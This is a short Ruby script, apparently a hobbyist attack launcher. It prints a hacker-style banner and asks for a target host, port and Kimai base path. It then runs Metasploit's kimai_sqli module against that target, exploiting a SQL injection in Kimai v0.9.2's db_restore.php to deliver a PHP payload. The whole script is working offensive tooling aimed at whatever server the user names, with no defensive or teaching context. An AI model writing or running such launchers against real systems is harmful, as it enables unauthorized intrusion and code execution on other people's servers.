require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
       Kimai v0.9.2 'db_restore.php' SQL Injection  
            Kimai version 0.9.2.x (PHP Payload)
	              Automatic::Unix
         
""".red
puts """
	 1st Try {set RPORT 80}
  Default is TARGETURI  /kimai/""".white


puts " [?] What is the target? ".blue
print "[!] ---> ".yellow
target = gets.chomp

puts " [?] What is the port? ".blue
print " [!] ---> ".yellow
port = gets.chomp

puts " [?] What is The base path to Kimai? ".blue
print " [!] ---> ".yellow
panel = gets.chomp






exec("msfconsole -x 'use exploit/unix/webapp/kimai_sqli' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'setg TARGETURI #{panel}' -x 'run'")

